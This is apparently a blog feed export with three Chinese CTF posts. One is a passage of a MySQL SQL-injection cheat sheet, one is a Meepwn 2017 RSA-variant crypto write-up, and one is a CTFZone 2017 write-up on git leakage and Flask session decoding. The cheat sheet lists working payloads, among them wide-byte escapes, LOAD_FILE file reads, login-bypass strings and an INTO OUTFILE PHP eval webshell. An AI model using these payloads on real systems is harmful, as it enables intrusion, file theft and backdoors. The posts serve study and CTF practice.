<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>有如下php代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">mysql_query(<span class="string">"SET NAMES 'gbk'"</span>);</div><div class="line">....</div><div class="line">$name = <span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) ? addslashes($_GET[<span class="string">'name'</span>]) : <span class="number">1</span>;</div><div class="line">$sql = <span class="string">"SELECT * FROM test WHERE names='&#123;$name&#125;'"</span>;</div></pre></td></tr></table></figure></p>
<p>addslashes()会在单引号或双引号前加上一个<code>\</code>。当mysql使用GBK字符集时，会把两个字符当作一个汉字，如%df%5c为運字。我们输入<code>name=root%df%27</code>，%在服务器端会出现如下转换：<code>root%df%27</code> -&gt; <code>root%df%5c%27</code> -&gt; <code>root運&#39;</code>。</p>
<p>更多内容可见：<a href="https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html" target="_blank" rel="external">浅析白盒审计中的字符编码及SQL注入</a></p>
<h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><h4 id="吃掉"><a href="#吃掉" class="headerlink" title="吃掉\"></a>吃掉<code>\</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">index.php?name=1%df&apos;</div><div class="line">index.php?name=1%a1&apos;</div><div class="line">index.php?name=1%aa&apos;</div><div class="line">...</div></pre></td></tr></table></figure>
<p>在被addslashes后，出现%XX%5c，当前一个字符的ascii码值大于128时，会被认为是一个宽字符，即使它不是个汉字。所以不是仅仅%df可以吃掉’\‘。</p>
<h4 id="利用"><a href="#利用" class="headerlink" title="利用\"></a>利用<code>\</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?name=%**%5c%5c%27</div></pre></td></tr></table></figure>
<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h2 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h2><p>利用sql注入可以导入导出文件，获取文件内容，或向文件写入内容。<br>查询用户读写权限：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT file_priv FROM mysql.user WHERE user = &apos;username&apos;;</div></pre></td></tr></table></figure></p>
<h3 id="load-file-读取"><a href="#load-file-读取" class="headerlink" title="load_file()读取"></a>load_file()读取</h3><h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><ul>
<li>需要有读取文件的权限</li>
<li>需要知道文件的绝对物理路径。</li>
<li>要读取的文件大小必须小于 max_allowed_packet</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT @@max_allowed_packet;</div></pre></td></tr></table></figure>
<h4 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h4><p>直接使用绝对路径,注意对路径中斜杠的处理。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">UNION SELECT LOAD_FILE(&quot;C://TEST.txt&quot;) #</div><div class="line"></div><div class="line">UNION SELECT LOAD_FILE(&quot;C:/TEST.txt&quot;) #</div><div class="line"></div><div class="line">UNION SELECT LOAD_FILE(&quot;C:\\TEST.txt&quot;) #</div></pre></td></tr></table></figure></p>
<p>使用编码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">UNION SELECT LOAD_FILE(CHAR(67,58,92,92,84,69,83,84,46,116,120,116)) #</div><div class="line"></div><div class="line">UNION SELECT LOAD_FILE(0x433a5c5c544553542e747874) #</div></pre></td></tr></table></figure></p>
<h3 id="select导出"><a href="#select导出" class="headerlink" title="select导出"></a>select导出</h3><h4 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h4><ul>
<li>一般要指定绝对路径</li>
<li>需导出的目录有可写权限</li>
<li>要outfile出的文件不能已经存在</li>
</ul>
<h4 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">UNION SELECT DATABASE() INTO OUTFILE &apos;C:\\phpstudy\\WWW\\test\\1&apos;;</div><div class="line"></div><div class="line">UNION SELECT DATABASE() INTO OUTFILE &apos;C:/phpstudy/WWW/test/1&apos;;</div></pre></td></tr></table></figure>
<h4 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h4><h5 id="条件-2"><a href="#条件-2" class="headerlink" title="条件"></a>条件</h5><ul>
<li>需要知道网站的绝对物理路径，这样导出后的webshell可访问</li>
<li>对需导出的目录有可写权限。</li>
</ul>
<h5 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UNION SELECT  &quot;&lt;?php eval($_POST[&apos;chybeta&apos;])?&gt;&quot; INTO OUTFILE &apos;C:/phpstudy/WWW/test/webshell.php&apos;;</div></pre></td></tr></table></figure>
<h2 id="万能密码后台登陆"><a href="#万能密码后台登陆" class="headerlink" title="万能密码后台登陆"></a>万能密码后台登陆</h2><ul>
<li>admin’ —</li>
<li>admin’ #</li>
<li>admin’/*</li>
<li>or ‘=’ or</li>
<li>‘ or 1=1—</li>
<li>‘ or 1=1#</li>
<li>‘ or 1=1/*</li>
<li>‘) or ‘1’=’1—</li>
<li>‘) or (‘1’=’1—</li>
</ul>
<h2 id="PDO堆查询"><a href="#PDO堆查询" class="headerlink" title="PDO堆查询"></a>PDO堆查询</h2><h1 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h1><p>请见：<a href="https://chybeta.gitbooks.io/waf-bypass/content/sql-injection/ji-ben-guo-waf-zi-shi-hui-zong.html" target="_blank" rel="external">WAF Bypass:SQL Injection</a></p>
<h2 id="sqlmap-tamper编写"><a href="#sqlmap-tamper编写" class="headerlink" title="sqlmap-tamper编写"></a>sqlmap-tamper编写</h2><h1 id="版本特性"><a href="#版本特性" class="headerlink" title="版本特性"></a>版本特性</h1><ul>
<li>mysql5.0以后  information.schema库出现</li>
<li>mysql5.1以后 udf 导入xx\lib\plugin\ 目录下</li>
<li>mysql5.x以后 system执行命令</li>
</ul>
<h1 id="常见sql注入位置"><a href="#常见sql注入位置" class="headerlink" title="常见sql注入位置"></a>常见sql注入位置</h1><ul>
<li>常见GET、POST参数</li>
<li>登陆框</li>
<li>http头</li>
</ul>
<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><h2 id="自动sql注入测试"><a href="#自动sql注入测试" class="headerlink" title="自动sql注入测试"></a>自动sql注入测试</h2><ul>
<li><a href="http://sqlmap.org/" target="_blank" rel="external">sqlmap</a></li>
<li>Pangolin</li>
<li>啊D</li>
</ul>
<h2 id="辅助工具"><a href="#辅助工具" class="headerlink" title="辅助工具"></a>辅助工具</h2><ul>
<li><a href="https:s//portswigger.net/burp/" target="_blank" rel="external">Burp Suite</a></li>
<li><a href="https://addons.mozilla.org/en-US/firefox/addon/hackbar1/?src=search" target="_blank" rel="external">firefox::HackBar</a></li>
</ul>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="http://websec.ca/kb/sql_injection#MySQL_Testing_Injection" target="_blank" rel="external">MySQL_Testing_Injection</a></li>
<li><a href="http://www.sqlinjectionwiki.com/Categories/2/mysql-sql-injection-cheat-sheet/" target="_blank" rel="external">MySQL SQL Injection Cheat Sheet</a></li>
<li><a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#Enablecmdshell" target="_blank" rel="external">SQL Injection Cheat Sheet</a></li>
<li><a href="https://www.waitalone.cn/mysql-injection-summary.html" target="_blank" rel="external">独自等待：MySQL注入总结</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Meenpwn-2017-crypto-writeup</title>
    <link href="http://yoursite.com/2017/07/19/Meenpwn-2017-crypto-writeup/"/>
    <id>http://yoursite.com/2017/07/19/Meenpwn-2017-crypto-writeup/</id>
    <published>2017-07-19T12:07:01.000Z</published>
    <updated>2017-07-28T07:23:17.885Z</updated>
    
    <content type="html"><![CDATA[<p>Meenpwn-2017-crypto-writeup<br><a id="more"></a></p>
<h1 id="Simpler-than-RSA"><a href="#Simpler-than-RSA" class="headerlink" title="Simpler than RSA?"></a>Simpler than RSA?</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&quot;RSA is just math&quot;. And now, there is a cryptosystem that simpler than RSA, but, &quot;Simple is the Best!&quot;</div><div class="line">simple.py pubkey.txt enc.txt</div></pre></td></tr></table></figure>
<p>simple.py：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> random</div><div class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> FLAG</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">(nbits)</span>:</span></div><div class="line">	p = getPrime(nbits)</div><div class="line">	q = getPrime(nbits)</div><div class="line">	n = p * q * p</div><div class="line">	g = random.randint(<span class="number">1</span>, n)</div><div class="line">	h = pow(g, n, n)</div><div class="line">	<span class="keyword">return</span> (n, g, h)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(m, n, g, h)</span>:</span></div><div class="line">	r = random.randint(<span class="number">1</span>, n)</div><div class="line">	c = pow(pow(g, m, n) * pow(h, r, n), <span class="number">1</span>, n)</div><div class="line">	<span class="keyword">return</span> c</div><div class="line"></div><div class="line">m = [ord(char) <span class="keyword">for</span> char <span class="keyword">in</span> FLAG]</div><div class="line">n, g, h = generate(<span class="number">90</span>)</div><div class="line">open(<span class="string">"pubkey.txt"</span>, <span class="string">"w"</span>).write(<span class="string">"&#123;0&#125;:&#123;1&#125;:&#123;2&#125;"</span>.format(n, g, h))</div><div class="line"></div><div class="line">c = [encrypt(mi, n, g, h) <span class="keyword">for</span> mi <span class="keyword">in</span> m]</div><div class="line">open(<span class="string">"enc.txt"</span>, <span class="string">"w"</span>).write(str(c))</div></pre></td></tr></table></figure></p>
<p><a href="https://gist.githubusercontent.com/quandqn/9cbae5f35d95dc0cf1b70a426a6da6e1/raw/e41da0cbf9897892f4737d4b412cdd5a53e6bd73/enc.txt" target="_blank" rel="external">enc.txt</a>和<a href="https://gist.githubusercontent.com/quandqn/991dfaf118779e498246077eca61f479/raw/d02c0f6c9ad749bb2f98896f979672e3d866298e/pubkey.txt" target="_blank" rel="external">pubkey.txt</a>就不直接贴出来了。</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="前期分析"><a href="#前期分析" class="headerlink" title="前期分析"></a>前期分析</h3><p>先对题目进行一下分析。目前已知<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">n = 1235280093599323856390922798440377476467763531842392869674688408727824382702235317</div><div class="line">g = 1110549711091392805024587195974719739929628997819528005374351081843256209971586072</div><div class="line">h = 610466084395822279908554174354632326166097007218620288020807622478449585661028278</div></pre></td></tr></table></figure></p>
<p>密文c也已知。由simply.py知道：</p>
<script type="math/tex; mode=display">c = [(g^{m}\mod n)\times(h^{r}\mod n )]\mod n</script><p>可以推出：</p>
<script type="math/tex; mode=display">c\equiv(g^{m}\times h^{r}) \mod n</script><p>其中的<code>r</code>是未知的，我们要想办法消去它。</p>
<p>继续分析。n = p <em> q </em> p，其中q，p均为质数，拿到<a href="http://factordb.com/index.php?query=1235280093599323856390922798440377476467763531842392869674688408727824382702235317" target="_blank" rel="external">factordb</a>上分解出：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">p = 1057817919251064684989791981</div><div class="line">q = 1103935256393984899021164397</div></pre></td></tr></table></figure></p>
<h3 id="引理"><a href="#引理" class="headerlink" title="引理"></a>引理</h3><p>参考：<a href="http://home.scarlet.be/math/congr.htm#The-smallest-solutio" target="_blank" rel="external">The smallest solution of a^x = 1 mod m with (a,m) = 1</a>，这边简要记录。<br>假设正整数n是满足下列同余式的最小正整数，并且a和m互质：</p>
<script type="math/tex; mode=display">a^{n}\equiv 1\mod m</script><p>由欧拉定理，有如下同余式。其中φ(m)是m的欧拉函数，表示小于m的与m互质的正整数的个数。</p>
<script type="math/tex; mode=display">a^{φ(m)}\equiv 1\mod m</script><p>现在假设$φ(m)=n\times{q}+r$，其中n的意义同上，q为商，r为余数。则欧拉定理可以改写为：</p>
<script type="math/tex; mode=display">a^{n\times{q}+r}\equiv 1\mod m</script><p>又因为$ a^{n\times{q}}\equiv 1\mod m $（这是n的性质），所以有：</p>
<script type="math/tex; mode=display">a^{r}\equiv 1\mod m</script><p>因为r&lt;n，而n是使同余式成立的最小正整数，所以必有r=0。所以接下去推导有：</p>
<script type="math/tex; mode=display">a^{q}\equiv 1\mod m</script><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>回到本题中，$n={p}^{2}\times{q}$，接下来我们考虑n的<a href="https://baike.baidu.com/item/%E6%AC%A7%E6%8B%89%E5%87%BD%E6%95%B0/1944850?fr=aladdin" target="_blank" rel="external">欧拉函数φ(n)</a>。<br>因为：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170718/12.jpg?raw=true" alt=""></p>
<p>所以：</p>
<script type="math/tex; mode=display">φ(n) = φ(p^{2}) \times φ(q)</script><p>因为：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170718/13.jpg?raw=true" alt=""></p>
<p>所以：</p>
<script type="math/tex; mode=display">φ(p^{2}) = (p-1) \times (p^{2-1}) = (p-1) \times p</script><script type="math/tex; mode=display">φ(q) = (q-1) \times (q^{1-1}) = q-1</script><p>所以对φ(n)，有如下等式成立：</p>
<script type="math/tex; mode=display">φ(n) = p \times {(p-1)} \times {(q-1)}</script><p>我们想要消去r，所以对h进行考虑，h和n互质，现在我们要找到φ(n)的一个分解因子k，使得根据引理，有$h^{k} \equiv 1 \mod n$。选择k=(p-1)*(q-1)恰好满足。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170718/14.jpg?raw=true" alt=""></p>
<p>所以有：</p>
<script type="math/tex; mode=display">h^{(p-1)\times{(q-1)}}\equiv{1}\mod{n}</script><p>也即：</p>
<script type="math/tex; mode=display">h^{(p-1)\times{(q-1)}\times{r}}\equiv{1^{r}}\mod{n}</script><p>在$ c\equiv(g^{m}\times h^{r}) \mod n $同时加上(p-1)*(q-1)次方。可以推得：</p>
<script type="math/tex; mode=display">c^{(p-1)\times(q-1)} \equiv g^{m \times (p-1) \times (q-1)} \mod n</script><p>其中m是明文的每一个字符，是可显的，范围为从32~126。可以对其进行爆破。</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">n = <span class="number">1235280093599323856390922798440377476467763531842392869674688408727824382702235317</span></div><div class="line">g = <span class="number">1110549711091392805024587195974719739929628997819528005374351081843256209971586072</span></div><div class="line">h = <span class="number">610466084395822279908554174354632326166097007218620288020807622478449585661028278</span></div><div class="line">p = <span class="number">1057817919251064684989791981</span></div><div class="line">q = <span class="number">1103935256393984899021164397</span></div><div class="line">tphi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</div><div class="line">ciper = [...太长省略...]</div><div class="line">flag = <span class="string">''</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> c <span class="keyword">in</span> ciper:</div><div class="line">    temp = pow(c,tphi,n)</div><div class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</div><div class="line">        <span class="keyword">if</span> temp == pow(g,f*tphi,n):</div><div class="line">            flag += chr(f)</div><div class="line"></div><div class="line">print(flag)</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170718/15.jpg?raw=true" alt=""></p>
<p>题目涉及文件：链接：<a href="http://pan.baidu.com/s/1qYTsJjY" target="_blank" rel="external">http://pan.baidu.com/s/1qYTsJjY</a> 密码：rnw7</p>
<h1 id="nub-cryptosystem"><a href="#nub-cryptosystem" class="headerlink" title="nub_cryptosystem"></a>nub_cryptosystem</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Quan is a nub-boi at Cryptography, but his dream is having an unbreakable cryptosystem. Could you prove him that &quot;nub is always nub&quot; by breaking his &apos;nub_cryptosystem&apos;?</div><div class="line">nub_cryptosystem.py pubkey.txt enc.txt</div></pre></td></tr></table></figure>
<h1 id="justpad"><a href="#justpad" class="headerlink" title="justpad"></a>justpad</h1><h1 id="T"><a href="#T" class="headerlink" title="|\/|/-\T|-|"></a>|\/|/-\T|-|</h1><h1 id="Freedom-Curve"><a href="#Freedom-Curve" class="headerlink" title="Freedom Curve"></a>Freedom Curve</h1>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Meenpwn-2017-crypto-writeup&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Crypto" scheme="http://yoursite.com/categories/writeup-Crypto/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="crypto" scheme="http://yoursite.com/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>CTFZone-2017-Leaked messages-writeup</title>
    <link href="http://yoursite.com/2017/07/19/CTFZone-2017-Leaked-messages-writeup/"/>
    <id>http://yoursite.com/2017/07/19/CTFZone-2017-Leaked-messages-writeup/</id>
    <published>2017-07-19T08:44:14.000Z</published>
    <updated>2017-07-26T10:57:04.154Z</updated>
    
    <content type="html"><![CDATA[<p>CTFZone-2017-Leaked messages-writeup<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">One of our candidates used to send restricted data to colleagues via this service</div><div class="line">because it&apos;s free and easy to use.</div><div class="line">Try to get some secrets which can compromise them.</div><div class="line">82.202.204.104</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170718/3.jpg?raw=true" alt=""><br>先注册一个账号，登陆</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170718/4.jpg?raw=true" alt=""></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170718/5.jpg?raw=true" alt=""></p>
<p>御剑扫出目录：<a href="http://82.202.204.104/backup/" target="_blank" rel="external">http://82.202.204.104/backup/</a></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170718/1.jpg?raw=true" alt=""></p>
<p>看文件，猜测是git泄露。用lijiejie的Githack只能下载到文件，没办法git log，而rip-git.pl提示说<code>[!] No more items to fetch. That&#39;s it!</code>，所以最后使用的工具是<a href="https://github.com/internetwache/GitTools" target="_blank" rel="external">GitTools</a>，不过如果直接用的话，会提示说没有找到<code>.git</code>目录，可以先将gitdumper.sh中以下代码去掉：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">if [[ ! &quot;$BASEURL&quot; =~ /.git/$ ]]; then</div><div class="line">    echo -e &quot;\e[31m[-] /.git/ missing in url\e[0m&quot;;</div><div class="line">    exit 0;</div><div class="line">fi</div></pre></td></tr></table></figure></p>
<p>执行命令:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/gitdumper.sh  http://82.202.204.104/backup/ dumper_LeakMessages</div></pre></td></tr></table></figure></p>
<p>之后查看git log，如下命令,其中<code>--no-paper</code>禁用paper分页，发现有flag.txt：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git --no-pager log -p -1</div></pre></td></tr></table></figure></p>
<p>得到如下结果：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170718/2.jpg?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; import base64</div><div class="line">&gt;&gt;&gt; base64.b32decode(&quot;MN2GM6TPNZSXW63IOR2HA4Z2F4XXS33VOR2WEZJOMNXW2L3XMF2GG2B7OY6UOMKJMJJHK2TLN4WUC7L5&quot;)</div><div class="line">&apos;ctfzone&#123;&#123;https://youtube.com/watch?v=G1IbRujko-A&#125;&#125;&apos;</div></pre></td></tr></table></figure>
<p>可惜，这是个假的flag。接下来利用extractor.sh 将历次commit的内容恢复出来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">../Extractor/extractor.sh dumper_LeakMessages/  extra_Leakmessages</div></pre></td></tr></table></figure></p>
<p>目录结构<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">├── 0-bd55b19e5413ce609d3bc4429c3a6f272341988a</div><div class="line">│   ├── commit-meta.txt</div><div class="line">│   ├── config.pyc</div><div class="line">│   ├── requirements.txt</div><div class="line">│   └── templates</div><div class="line">│       ├── index.html</div><div class="line">│       ├── login.html</div><div class="line">│       ├── messages.html</div><div class="line">│       └── register.html</div><div class="line">├── 1-8b1084b23d869e5dc1ae4ac845589ecfb896c0c3</div><div class="line">│   ├── commit-meta.txt</div><div class="line">│   ├── requirements.txt</div><div class="line">│   ├── static</div><div class="line">│   │   ├── css</div><div class="line">│   │   │   ├── bootstrap.min.css</div><div class="line">│   │   │   ├── login.css</div><div class="line">│   │   │   ├── main.css</div><div class="line">│   │   │   └── material-input.css</div><div class="line">│   │   ├── flag.txt</div><div class="line">│   │   └── js</div><div class="line">│   │       └── bootstrap.min.js</div><div class="line">│   └── templates</div><div class="line">│       ├── index.html</div><div class="line">│       ├── login.html</div><div class="line">│       ├── messages.html</div><div class="line">│       └── register.html</div><div class="line">└── 2-9f848cceeba31da2cbd2c8ecaebb8a8dab17eee4</div><div class="line">    ├── commit-meta.txt</div><div class="line">    ├── requirements.txt</div><div class="line">    ├── static</div><div class="line">    │   ├── css</div><div class="line">    │   │   ├── bootstrap.min.css</div><div class="line">    │   │   ├── login.css</div><div class="line">    │   │   ├── main.css</div><div class="line">    │   │   └── material-input.css</div><div class="line">    │   └── js</div><div class="line">    │       └── bootstrap.min.js</div><div class="line">    └── templates</div><div class="line">        ├── index.html</div><div class="line">        ├── login.html</div><div class="line">        ├── messages.html</div><div class="line">        └── register.html</div></pre></td></tr></table></figure></p>
<p>先读取一下requirements.txt，知道是flask应用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">cat requirements.txt</div><div class="line">flask</div><div class="line">flask_recaptcha</div></pre></td></tr></table></figure></p>
<p>其中的<code>config.pyc</code>是其配置文件。利用<a href="https://github.com/rocky/python-uncompyle6" target="_blank" rel="external">uncompyle6</a>进行反汇编：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/test# uncompyle6 config.pyc</div><div class="line"># uncompyle6 version 2.11.2</div><div class="line"># Python bytecode 3.6 (3379)</div><div class="line"># Decompiled from: Python 2.7.13 (default, Jan 19 2017, 14:48:08)</div><div class="line"># [GCC 6.3.0 20170118]</div><div class="line"># Embedded file name: config.py</div><div class="line"># Compiled at: 2017-07-15 01:28:42</div><div class="line"># Size of source mod 2**32: 288 bytes</div><div class="line"></div><div class="line"></div><div class="line">class BaseConfig(object):</div><div class="line">    DEBUG = False</div><div class="line">    SECRET_KEY = &apos;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&apos;</div><div class="line">    DB_NAME = &apos;messages.db&apos;</div><div class="line">    RECAPTCHA_ENABLED = True</div><div class="line">    RECAPTCHA_THEME = &apos;dark&apos;</div><div class="line">    RECAPTCHA_TYPE = &apos;image&apos;</div><div class="line">    RECAPTCHA_SIZE = &apos;normal&apos;</div><div class="line">    RECAPTCHA_RTABINDEX = 10</div><div class="line"># okay decompiling config.pyc</div></pre></td></tr></table></figure></p>
<p><code>SECRET_KEY</code>用于生成flask session。可以用<a href="https://github.com/noraj1337/flask-session-cookie-manager" target="_blank" rel="external">Flask Session Cookie Decoder/Encoder</a>进行解密。比如前面用burp抓包得到的session：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">session=eyJudW1iZXIiOiIzMjY0MTAwMzE3MjYiLCJ1c2VybmFtZSI6ImNoeWJldGEifQ.DFBD8w.f5sHhO4vBngV-EtNRMOPw28PFkA</div></pre></td></tr></table></figure></p>
<p>对其进行解密：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/flask-session-cookie-manager# python session_cookie_manager.py decode -c &quot;eyJudW1iZXIiOiIzMjY0MTAwMzE3MjYiLCJ1c2VybmFtZSI6ImNoeWJldGEifQ.DFBD8w.f5sHhO4vBngV-EtNRMOPw28PFkA&quot; -s &quot;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&quot;  </div><div class="line">&#123;u&apos;username&apos;: u&apos;chybeta&apos;, u&apos;number&apos;: u&apos;326410031726&apos;&#125;</div></pre></td></tr></table></figure></p>
